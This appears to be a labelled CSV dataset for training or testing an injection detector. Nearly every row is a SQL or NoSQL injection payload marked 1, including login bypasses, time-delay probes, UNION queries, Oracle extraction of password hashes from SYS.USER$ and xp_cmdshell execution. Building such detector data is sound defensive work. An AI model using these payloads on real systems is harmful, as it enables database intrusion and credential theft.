payload,label
""");waitfor delay '0:0:__TIME__'--",1
)) or pg_sleep(__TIME__)--,1
admin') or '1'='1'#,1
')) or (('x'))=(('x,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i",1
root' or '1'='1'--,1
or 3=3,1
%20'sleep%2050',1
"admin"") or (""1""=""1""--",1
declare @s varchar(200) select @s = 0x77616974 ...,1
root' or '1'='1,1
%21,1
'%20%26%26%20this.password.match(/.*/)//+%00,1
limit,1
db.injection.insert({success:1});,1
declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),1
1) or sleep(__TIME__)#,1
' or 1=1 or ''=',1
or 1/*,1
uni/**/on sel/**/ect,1
hi' or 'x'='x';,1
""")) or pg_sleep(__TIME__)--",1
'%20or%20''=',1
or 'a'='a,1
) union select * from information_schema.tables;,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i",1
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);,1
UNION SELECT,1
' or '1'='1'--,1
');waitfor delay '0:0:__TIME__'--,1
));waitfor delay '0:0:__TIME__'--,1
',1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i",1
""") or (""x"")=(""x",1
'; exec master..xp_cmdshell,1
"root"") or (""1""=""1""--",1
 or 3=3 --,1
"admin"") or ""1""=""1""--",1
"1234 ' AND 1=0 UNION ALL SELECT 'root', '81dc9bdb52d04dc20036dbd8313ed055",1
or pg_sleep(__TIME__)--,1
UNION ALL SELECT,1
or sleep(__TIME__)#,1
select * from information_schema.tables--,1
') or ('a'='a,1
[$ne]=1,1
sleep(__TIME__)#,1
"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1
password:*/=1--,1
or 1 in (select @@version)--,1
id=42&action=view,0
"admin"") or ""1""=""1",1
